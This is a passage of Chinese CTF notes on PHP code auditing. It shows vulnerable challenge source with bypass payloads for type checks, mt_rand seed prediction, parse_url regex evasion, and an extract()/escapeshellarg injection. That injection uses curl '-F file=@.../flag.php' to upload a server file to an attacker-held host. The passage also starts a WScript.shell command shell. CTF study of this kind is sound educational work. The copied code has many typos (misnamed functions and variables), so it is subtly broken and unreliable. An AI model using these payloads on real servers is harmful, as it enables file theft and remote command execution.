punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                 <span class="token comment" spellcheck="true">//此处通过intval等函数，要求是回文数</span>    <span class="token variable">$valuel</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">"number"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$value2</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">"number"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value1</span> <span class="token operator">!=</span> <span class="token variable">$value2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$info</span><span class="token operator">=</span><span class="token string">"no, this is not a palindrome number!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>                <span class="token keyword">else</span>    <span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">//此处通过自定义函数，要求不能是回文数</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_palindrome_number</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">"number"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token string">"nice! {Svalue1} is a palindrome number! "</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//思路：</span><span class="token comment" spellcheck="true">//  1.get传值 ：number</span><span class="token comment" spellcheck="true">//    2.过 is_numeric $_REQUEST['NUMBER']  ，number不能是数字，所以带上不会被跳过的特殊字符%00</span><span class="token comment" spellcheck="true">//    3.常规字符串  在intval会消失  插入一些特殊的值</span><span class="token comment" spellcheck="true">//    4.$req intval rev 字符串中必然携带回文数121</span><span class="token comment" spellcheck="true">//    5.is_palindrome_number req    \f121   %0c121  只能传\f 因为trim不会去除\f，is_numeric 会跳过\f，并且f的ASCII码值为12</span><span class="token comment" spellcheck="true">// payload ： number=%00%0c121</span></code></pre><h4 id="4-伪随机数"><a href="#4-伪随机数" class="headerlink" title="4.伪随机数"></a>4.伪随机数</h4><ul><li><code>mt_rand(min,max):int</code> ：随机数发生器，生成一个min和max之间的数，如果没有指定min和max，返回 0 到<code>mt_getrandmax()</code>之间的伪随机数，有<strong>范围</strong></li><li><code>mt_srand(seed)</code>：seed可选，用来给随机数发生器播种。从php 4.2.0 开始，不再需要seed播种，该操作由系统完成</li><li>如果种子seed是确定的，则产生的随机数是一样的<ul><li>通过工具“php_mt_seed”逆推mt_rand的种子</li><li>必须拿到<code>第一个随机数</code>才能逆推回去</li></ul></li><li>phar的生成方法：将写好的phpinfo.php添加到压缩包(test.zip)中，修改压缩包后缀即可<ul><li>访问压缩包中的文件的方法：phar://the-path/test.zip/phpinfo.php</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"please input a rand_num !"</span><span class="token punctuation">:</span><span class="token keyword">function</span> <span class="token function">crepte_password</span><span class="token punctuation">(</span><span class="token variable">$pw_length</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$randpwd</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$pw_length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$randpwd</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token variable">$randpwd</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#var_dump($_SESSION);</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$time</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token function">create_password</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token shell-comment comment">#var_dump(($_SESSION[</span><span class="token string">"userLogin"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$pwd</span><span class="token punctuation">.</span><span class="token string">'||'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token shell-comment comment">#echo $time;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$pwd</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"first"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userLogin'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                         <span class="token comment" spellcheck="true">//如果保证每次都是第一次访问，那session就是空</span>        <span class="token keyword">echo</span> <span class="token string">"Nice ，you get the flag it is"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"Wrong!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>                                        <span class="token comment" spellcheck="true">//如果保证每次都是第一次访问，那session就是空</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userLogin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">create_password</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//此处就可以忽略</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//上题需要time()产生时间，必须保证电脑与服务器时间同一，此处可使用python脚本或php去跑</span><span class="token comment" spellcheck="true">//php例子</span><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">crepte_password</span><span class="token punctuation">(</span><span class="token variable">$pw_length</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$randpwd</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$pw_length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$randpwd</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$randpwd</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token function">creat_password</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//xx.xx.xx.xx/xx.php?pwd='.$pwd;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'curl '</span><span class="token punctuation">.</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="5-运算符优先级："><a href="#5-运算符优先级：" class="headerlink" title="5.运算符优先级："></a>5.运算符优先级：</h4><ul><li><code>parse_url():mixed</code>：解析url，返回其组成部分（数组），如果url不标准，会返回false</li><li>运算符顺序如下：</li></ul><p><img src="https://gitee.com/lingying177/blogimage/raw/master/img/CTF/9.php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1--%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7.png" alt=""></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span> <span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'test'</span> <span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'test2'</span> <span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">//本题不用纠结 and的问题，因为and的优先级比‘=’低，所以是先赋值给$c</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">" is_numeric(b)"</span> <span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'is_numeric(a) error'</span> <span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">print</span>  <span class="token string">"is_numeric(a) and is_numeric(b) error!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//payload ： a=123</span><span class="token comment" spellcheck="true">//不用在乎$b</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span> <span class="token punctuation">;</span><span class="token variable">$numberl</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100000000000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$number2</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100000000000</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token variable">$number3</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100000000</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REQUEST_URI"</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token shell-comment comment">#echo $url.</span><span class="token string">"&lt;br/>"</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token constant">PHP_URL_QUERY</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#echo $url.</span><span class="token string">"&lt;br/>"</span>  <span class="token comment" spellcheck="true">//此处进行破坏，构造url，使用 '///' ，就会直接跳过正则</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/_/i"</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"..1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/0/i"</span><span class="token punctuation">,</span><span class="token variable">$ur1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"..2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//3.破坏此处的正则，需要在上面进行破坏</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\w+/i"</span><span class="token punctuation">,</span><span class="token variable">$ur1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"..3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"_"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token comment" spellcheck="true">//1.注意：php文档中说，点和空格会被转化为下划线，所以可通过点和空格绕过下划线的匹配</span>    <span class="token variable">$control</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$control</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$number1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//2.此处会把“_”的值赋值给control，然后用in_arrary去比较，但是0会被前面的正则匹配到，所以去破坏前面的正则，使其不能正确匹配</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fail1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$control</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$number2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fail2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$control</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$number3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fai13"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//payload ： http://xxx.xxx.xx.xx///path.php?_=a     //在in_array()中，a就是null，等于0</span><span class="token comment" spellcheck="true">//payload ： http://xxx.xxx.xx.xx///path.php?.=a</span></code></pre><h4 id="6-escapeshellarg与-escapeshellcmd"><a href="#6-escapeshellarg与-escapeshellcmd" class="headerlink" title="6.escapeshellarg与 escapeshellcmd"></a>6.<code>escapeshellarg</code>与 <code>escapeshellcmd</code></h4><ul><li><p><code>escapeshell(string $arg):string</code>把字符串转码为可以在shell命令里使用的参数</p><ul><li>escapeshellarg()将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入shell函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含exec()，system()执行运算符。</li></ul></li><li><p><code>escapeshellcmd(string $command):string</code>：对命令中符号做限制</p><ul><li>escapeshellcmd()对字符串中可能会欺骗shell命令执行任意命令的字符进行转义。此函数保证用户输入的数据在传送到exec()或system()函数，或者执行操作符之前进行转易义。</li><li>反斜线(\)会在以下字符之前插入: <code>&amp;#;~/*?~&lt;&gt;^()[]{}$\, \x0A和\xFF</code>。<code>&#39;</code> 和<code>”</code>仅在不配对的时候被转义。在Windows平台上，所有这些字符以及%和!字符都会<strong>被空格代替</strong>。</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highiight_file</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/flag/i'</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"are you a hacker"</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'_POST'</span><span class="token punctuation">,</span><span class="token string">'_GET'</span><span class="token punctuation">,</span><span class="token string">'_COOKIE'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$_R</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token variable">$_R</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span>$<span class="token variable">$_R</span> <span class="token keyword">as</span> <span class="token variable">$_k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$_v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$<span class="token variable">$_k</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> $<span class="token variable">$_k</span> <span class="token operator">==</span> <span class="token variable">$_v</span><span class="token punctuation">)</span> <span class="token function">unset</span><span class="token punctuation">(</span>$<span class="token variable">$_k</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// unset()，可以释放变量</span>        <span class="token punctuation">}</span>                      <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span> <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">,</span><span class="token constant">EXTR_SKIP</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//使用POST传入_GET[flag]意思是传入了一个名为_GET的数组，flag是数组中的键，利用这个语句，将_GET提取出来</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token constant">EXTR_SKIP</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//利用这个语句，将_GET数组的内容提取出来</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hongri'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//flag与hongri的值不能相等，但是md5 必须一样</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hongri'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ur1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//传入url=</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$urlinfo</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$ur1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br> url is $url &lt;/br>"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$urlinfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token string">"http"</span> <span class="token operator">===</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$urlinfo</span><span class="token punctuation">[</span><span class="token string">"scheme"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"https"</span> <span class="token operator">===</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$urlinfo</span><span class="token punctuation">[</span><span class="token string">"scheme"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"scheme error1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$ur1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>final url is $ur1&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl"</span><span class="token punctuation">.</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//使用POST传入 _GET[flag] 意思是 传入了一个名为_GET的数组，flag是数组中的键，之后通过变量提取之后，出现了$_GET变量，然后通过第二个extract()对_GET数组进行提取，将flag提取出来</span><span class="token comment" spellcheck="true">//get处传入的payload ： ?flag=s878926199a&amp;hongri=QNKCDZO&amp;url=http://xx.xx.xx.xx:5555/sdf' -F file=@/var/wwwhtml/php/cmd_1/lag.php'  //直接读取那个文件</span><span class="token comment" spellcheck="true">//_GET[flag]=s878926199a&amp;_GET[hongri]=QNKCDZO&amp;_GET[url]=http://xx.xx.xx.xx:5555/sdf' -F file=@/var/www/htm/php/cmd_1/flag.php'</span><span class="token comment" spellcheck="true">//通过get和post方式分别传入值，实现绕过                                                                               </span></code></pre><h4 id="7-绕过disable-function"><a href="#7-绕过disable-function" class="headerlink" title="7.绕过disable_function"></a>7.绕过<code>disable_function</code></h4><ul><li>Windows下的COM（系统组件）</li></ul><pre class=" language-php"><code class="language-php">    <span class="token delimiter">&lt;?php</span>    <span class="token variable">$command</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$wsh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">COM</span><span class="token punctuation">(</span> <span class="token string">'WScript.shell'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//生成一个COM对象Shell.Application也能</span>    <span class="token variable">$exec</span> <span class="token 